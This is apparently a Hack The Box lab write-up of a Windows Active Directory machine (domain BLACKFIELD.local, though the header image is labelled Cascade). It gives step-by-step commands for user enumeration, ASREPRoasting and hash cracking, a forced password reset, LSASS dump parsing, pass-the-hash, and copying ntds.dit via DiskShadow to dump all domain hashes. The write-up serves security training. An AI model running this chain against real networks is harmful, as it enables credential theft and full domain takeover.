---
date: 2025-04-06
categories: [Windows, Hard, AD]
---

![Cascade](https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [aas](https://app.hackthebox.com/users/6259)        | [Hack The Box](https://www.hackthebox.com/)     | Hard           | Windows   |

---








- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.
	
	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.192 -oG scan
	/opt/extractports scan
	nmap -p53,88,135,139,389,445,593,3268,5985,49677 -sCV -Pn 10.10.10.192 -oN ports
	nmap -p53,88,135,    389,445,593,3268,5985 -sCV -Pn 10.10.10.192 -oN ports
	```

	![image](https://github.com/user-attachments/assets/e88142a7-b3df-40db-89d4-26cff2d05c67)

- I found the domain `BLACKFIELD.local` and I add it to the file in the `hosts` file
- As I see port 53 open, I list mail servers and find another domain I can add to the `hosts` file

	```python
	dig @10.10.10.192 BLACKFIELD.local mx
	```

	![image](https://github.com/user-attachments/assets/6a47af27-c241-4792-baa3-ff56c17c3a56)

- Having the SMB ports open, I start to enumerate them using null credentials and manage to see several shares but find nothing relevant.

	```python
	netexec smb 10.10.10.192 -u "Guest" -p "" --shares
	```
	
	![image](https://github.com/user-attachments/assets/695079ae-127b-4443-bda9-c1b6ded2ae14)

- Using brute force I list system users and manage to find a couple of users.

	```python
	/opt/kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
	```

	![image](https://github.com/user-attachments/assets/46fe6f4b-b8e0-4953-aeb9-0eb8242c559e)

 - After validating that the users exist with kerbrute, we can make an ASREPRoast Attack (TGT) and find a user that does not have “Dont require preauth” set and we can get its hash.
	
	```python
	impacket-GetNPUsers BLACKFIELD.local/ -no-pass -usersfile usernames
	```
	
	![image](https://github.com/user-attachments/assets/9c3a869b-21f3-4c59-9d90-64b2f6916e3b)

- By brute force we tried to get the clear text password from the hash and succeeded in obtaining it.
	
	```python
	hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
	```
	
	![image](https://github.com/user-attachments/assets/a101bbbf-1699-41d2-bdd2-c91697951cdc)

- Using the credentials found for the user support we can list the resources shared by SMB and observe that he has access to more directories than if we use null credentials.

	```python
	netexec smb 10.10.10.192 -u support -p '#0XXXXXXXXXt' --shares
	```
	
	![image](https://github.com/user-attachments/assets/dc94be31-2d65-4387-9b01-fba26f486fa2)

- Before going into the SMB shares I decide to list the users and groups of the system to get a more global version of the system I am dealing with.
- My attention is drawn to the user SVC_backup that belongs both to the group “Remote Management Users”, with which I could connect to the system, and to the group “Backup Operators” with which I could make a copy of the system to extract the user hashes.
	
	```python
	ldapdomaindump -u 'BLACKFIELD.local\support' -p "#0XXXXXXXXXt" 10.10.10.192
	```
	
	![image](https://github.com/user-attachments/assets/f6eff121-05c2-47d4-8433-7359f0fc3808)
	
	![image](https://github.com/user-attachments/assets/da44a3cc-ec66-4777-8246-9884e67305e1)

- When consulting the shared resources I find many directories so I mount them in my machine to be able to consult them with greater facility.
	
	```python
	mkdir /mnt/smbmounted
	mount -t cifs //10.10.10.192/profiles$ /mnt/smbmounted -o username=support,password=#0XXXXXXXXXt,domain=BLACKFIELD.local,rw
	```

- When I look inside all the folders I can't find anything.
- I decide to continue enumerating the system in order to observe potential avenues for escalating privileges or making a lateral move with bloodhound.
- Starting from the user I have credentials, support, I have ForceChangePassword permissions on the user Audir2020. This allows me to change the user's password without needing to know his current password.
	
	```python
	bloodhound-python -c all -u 'support' -p "#0XXXXXXXXXt" -ns 10.10.10.192 -d BLACKFIELD.local
	```
	
	![image](https://github.com/user-attachments/assets/2970aa29-32a0-436b-ba44-beb2280b28d4)

- With the help of this [resource](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) I manage to change the password for the user Audit2020. When consulting with these credentials which shared resources I have read permissions I find the forensic folder.

	```python
	net rpc password "AUDIT2020" -U "BLACKFIELD.local"/"support"%"#0XXXXXXXXXt" -S "dc01.BLACKFIELD.local"
		#Pepe1234!
	netexec smb 10.10.10.192 -u AUDIT2020 -p Pepe1234! --shares
	```
	
	![image](https://github.com/user-attachments/assets/0eb3c675-e9c2-4311-a4f7-71e14f1e7f21)

- When I consult the resource I find multiple files but I am struck by one inside the memory_analysis folder called lsass.zip

  ```python
  smbclient -U 'AUDIT2020' //10.10.10.192/forensic
  ```

-  I download the file, extract it and use pypykatz to query its contents and I manage to find the NT hash of the Administrator user (which is not valid) and that of the svc_backup user.

	```python
	 unzip lsass.zip
	 pypykatz lsa minidump lsass.DMP > lsass_pypykatz
	```
	
	![image](https://github.com/user-attachments/assets/5de257cf-a793-4f50-bfe9-43fc0795e72f)

- I try to do Pass-the-Hash (PtH) with the user svc_backup and I get access to the system and I can read the first flag.
	
	```python
	netexec winrm 10.10.10.192 -u svc_backup -H 96xxxxxxxxxxxxxxxxxxxxxxxxxxx00d:96xxxxxxxxxxxxxxxxxxxxxxxxxxx00d
	evil-winrm -i 10.10.10.192 -u svc_backup -p 96xxxxxxxxxxxxxxxxxxxxxxxxxxx00d:96xxxxxxxxxxxxxxxxxxxxxxxxxxx00d
	```
	
	![image](https://github.com/user-attachments/assets/8167a6ca-0138-43f9-9dda-6b068429ff69)

- As we have seen previously, the user svc_backup belongs to the group “Backup Operators” and when we see what permissions it has, SeBackupPrivilege and SeRestorePrivilege catch our attention.
- Thanks to these permissions we can try to make a copy of the system to extract the NT hashes of the users.

	![image](https://github.com/user-attachments/assets/e36e59c2-ed44-4491-8526-127b10049c6c)

- As a first attempt I make a copy of the sam and system files to use them later with secretsdump to obtain the hashes. When validating these hashes they are not correct so I have to look for other ways to make the copy.
	
	```python
	reg save hklm\sam .\sam.backup
	reg save hklm\system .\system.backup
	impacket-secretsdump -sam sam.backup -system system.backup LOCAL
	```
	
	![image](https://github.com/user-attachments/assets/66f5a740-2f30-4c99-8198-e7549abae2c8)

- I try to make a copy of the ntds file but it does not allow it at first.
- When looking for different ways to make a copy of this file I find a [blog](https://pentestlab.blog/tag/diskshadow/) that shows how using DiskShadow we can make the copy.
- We start by uploading a file with the following content.

	```python
	#it is important to leave a blank space at the end of each line.
	set context persistent nowriters 
	add volume c: alias someAlias 
	create 
	expose %someAlias% z:
	```

- Once the file is uploaded we use diskshadow pointing to the file.
	
	```python
	diskshadow.exe /s C:\Users\svc_backup\Documents\diskshadow.txt
	```

- This will create a replica of the system in z:\ and on this we can use robocopy to make a copy of the ntds file.
	
	```python
	robocopy /b z:\Windows\NTDS\ . ntds.dit
	```

- We download the copy of the file ntds.dit and together with the copy of system that we had done before, we get the system hashes
	
	```python
	impacket-secretsdump -ntds ntds.dit -system system.backup -hashes lmhash:nthash LOCAL
	```
	
	![image](https://github.com/user-attachments/assets/b3c3b20d-08cc-4eed-ad5c-2a3473e5ec75)
		
- I try to do Pass-the-Hash (PtH) with the user Administrator and I get access to the system and I can read the second flag.
	
	```python
	evil-winrm -i 10.10.10.192 -u Administrator -H 18XXXXXXXXXXXXXXXXXXXXXXXXXXee 
	```
	
	![image](https://github.com/user-attachments/assets/ba8c8d16-735b-48c5-bdaf-3983c518fdd0)
